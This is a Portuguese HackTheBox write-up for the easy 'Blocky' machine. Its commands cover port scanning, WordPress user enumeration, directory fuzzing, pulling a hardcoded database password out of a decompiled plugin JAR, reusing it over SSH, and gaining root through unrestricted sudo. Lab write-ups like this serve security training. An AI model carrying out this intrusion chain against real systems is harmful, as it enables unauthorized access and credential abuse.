Blocky

HackTheBox · Easy by Brenno M.

Blocky hospeda um WordPress e um servidor de Minecraft. Um plugin Java exposto em /plugins traz uma senha fixa no código, reaproveitada pelo usuário notch no SSH, e esse usuário tem sudo irrestrito.

Reconhecimento

O Nmap mostra FTP, SSH, Apache e um Minecraft 1.11.2 na 25565. O site redireciona para blocky.htb.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p21,22,80,25565 <IP>
# 21 ftp, 22 OpenSSH 7.2p2, 80 Apache 2.4.18, 25565 Minecraft 1.11.2
echo "<IP> blocky.htb" | sudo tee -a /etc/hosts

O site é um WordPress. A API REST lista os autores, e o único é notch. O fuzzing encontra o diretório /plugins, com dois arquivos JAR.

curl -s http://blocky.htb/wp-json/wp/v2/users | jq -r '.[].slug'
# notch
ffuf -u http://blocky.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
# phpmyadmin, plugins, wiki, wp-admin, ...

Exploração - credencial no JAR

O BlockyCore.jar é o plugin feito pelo próprio dono do servidor. Decompilado, ele mostra as credenciais do banco escritas direto no código.

wget http://blocky.htb/plugins/files/BlockyCore.jar
unzip BlockyCore.jar -d core
javap -c -constants -p core/com/myfirstplugin/BlockyCore.class | grep -A1 sql
public class BlockyCore {
  public String sqlHost = "localhost";
  public String sqlUser = "root";
  public String sqlPass = "<senha>";
}

A senha do root do MySQL funciona no SSH como notch, o autor do WordPress.

ssh notch@<IP>
cat ~/user.txt

Escalação - sudo

O notch pode rodar qualquer comando como qualquer usuário via sudo, com a própria senha.

sudo -l
# (ALL : ALL) ALL
sudo -i
cat /root/root.txt
